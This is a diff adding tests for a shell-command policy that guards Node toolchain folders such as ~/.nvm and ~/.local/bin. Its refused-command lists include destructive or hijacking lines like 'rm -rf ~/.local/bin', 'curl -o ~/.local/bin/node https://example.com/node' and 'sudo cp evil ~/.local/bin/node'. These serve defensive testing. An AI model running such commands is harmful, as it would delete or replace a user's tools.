@@ -101,3 +101,80 @@ test('Windows per-user folders are protected', () => {
 test.after(() => {
   for (const d of [home, proj]) fs.rmSync(d, { recursive: true, force: true });
 });
+
+// Review fixes: reading and running, own tools in the bin folders, odd environment values, parent folders.
+
+test('reading, running, sourcing and changing into those folders is not refused', () => {
+  const ok = [
+    'source ~/.nvm/nvm.sh && nvm use 22',
+    '. ~/.nvm/nvm.sh',
+    '~/.nvm/versions/node/v22.1.0/bin/node script.js',
+    '~/.local/bin/node --version',
+    '$HOME/.volta/bin/node -e "console.log(1)"',
+    'cp ~/.local/bin/node /tmp/nodecopy',
+    'cd ~/.local/bin && ls',
+    'cd ~/.nvm && cat nvm.sh',
+    'cat ~/.local/bin/zn | head -1',
+  ];
+  for (const c of ok) assert.equal(sh(c), null, c);
+});
+
+test('own tools can be installed in the bin folders; only node and zn names and the folder itself are refused', () => {
+  const ok = [
+    'mkdir -p ~/.local/bin',
+    'mkdir -p ~/bin',
+    'cp target/release/mytool ~/.local/bin/',
+    'install -m755 build/tool ~/.local/bin/',
+    'tar -C ~/.local/bin -xzf tool.tgz',
+    'mkdir -p ~/bin && cp scripts/deploy.sh ~/bin/',
+    'cp -t ~/.local/bin ./mytool',
+    'ln -s ./mytool ~/.local/bin/mytool',
+    'install -d ~/.local/bin',
+  ];
+  for (const c of ok) assert.equal(sh(c), null, c);
+  const bad = [
+    'rm -rf ~/.local/bin',
+    'mv ~/bin ~/bin.old',
+    'ln -sfn ~/other ~/.local/bin',
+    'cp ./node ~/.local/bin/',
+    'install -m755 ./zn ~/bin/',
+    'cp -t ~/.local/bin ./node',
+    'cp ./build/zn.exe ~/.local/bin',
+    'mv ./x ~/.local/bin/node',
+    'sudo cp evil ~/.local/bin/node',
+    'tar -C ~/.nvm -xzf x.tgz',
+    'curl -o ~/.local/bin/node https://example.com/node',
+    'dd if=evil of=~/bin/zn',
+    'find ~/.nvm -delete',
+    "python3 -c \"open('" + home + "/.local/bin/node','w').write('x')\"",
+  ];
+  for (const c of bad) assert.match(String(sh(c)), /protected|zn:/, c);
+});
+
+test('an environment value that is relative, the home folder, the project or a system folder is ignored', () => {
+  const values = ['.', '..', 'tools', home, home + '/', proj, require('node:path').dirname(proj), '/', '/usr', '/opt', ''];
+  for (const name of ['N_PREFIX', 'NVM_DIR', 'ASDF_DATA_DIR', 'VOLTA_HOME', 'FNM_DIR', 'NVM_HOME', 'NVM_SYMLINK']) {
+    for (const v of values) {
+      const o = { ...O, env: { [name]: v } };
+      assert.equal(policy.writeDenial(home + '/notes.txt', o), null, name + '=' + v);
+      assert.equal(policy.writeDenial(proj + '/src/a.js', o), null, name + '=' + v);
+      assert.equal(sh('echo x > ' + home + '/notes.txt', o), null, name + '=' + v);
+    }
+  }
+});
+
+test('the parent folders cannot be moved or deleted to swap a protected folder', () => {
+  const bad = [
+    'mv ~/.local ~/.local.old',
+    'mkdir -p ~/stage/bin && mv ~/stage ~/.local',
+    'mv ~/.asdf ~/asdf.old',
+    'rm -rf ~/.local',
+    'cp -r ~/stage ~/.local',
+    'mv ~/.local/share ~/share.old',
+    'rm -rf ~/.asdf',
+  ];
+  for (const c of bad) assert.match(String(sh(c)), /protected/, c);
+  const ok = ['ls ~/.local', 'cp a ~/.local/share/x.txt', 'mkdir -p ~/.local/share/app', 'touch ~/.local/foo', 'rm ~/.local/share/x.txt',
+    'cp -r app ~/.local/share/app', 'cd ~/.local && ls'];
+  for (const c of ok) assert.equal(sh(c), null, c);
+});
